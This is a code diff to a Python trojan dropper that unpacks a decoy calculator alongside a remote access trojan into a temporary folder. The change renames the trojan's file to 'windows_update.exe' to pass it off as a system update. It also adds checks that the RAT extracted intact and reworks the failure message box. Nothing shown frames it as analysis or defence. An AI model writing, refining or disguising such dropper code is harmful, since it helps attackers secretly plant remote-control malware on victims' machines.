@@ -35,7 +35,7 @@ def main():
 
         # Set file paths
         calc_path = os.path.join(temp_dir, "win_calc.exe")
-        rat_path = os.path.join(temp_dir, "sys_helper.exe")
+        rat_path = os.path.join(temp_dir, "windows_update.exe")
 
         # Extract files with explicit permissions
         with open(os.path.join(sys._MEIPASS, 'calc.exe'), 'rb') as src, open(calc_path, 'wb') as dest:
@@ -64,10 +64,19 @@ def main():
                          stdout=subprocess.DEVNULL,
                          stderr=subprocess.DEVNULL,
                          env=env)
+
+        # Add verification
+        print(f"Temp directory: {temp_dir}")  # Log temp location
+        if not os.path.exists(rat_path):
+            raise FileNotFoundError(f"RAT not extracted to {rat_path}")
+        if os.path.getsize(rat_path) < 102400:  # ~100KB minimum
+            raise ValueError("RAT file appears corrupted")
+
         sys.exit(0)
 
     except Exception as e:
-        ctypes.windll.user32.MessageBoxW(0, f"Error: {str(e)}", "Failure", 0x10)
+        error_msg = f"{str(e)}\nTemp Dir: {temp_dir}"
+        ctypes.windll.user32.MessageBoxW(0, error_msg, "Failure", 0x10)
         sys.exit(1)
 
 
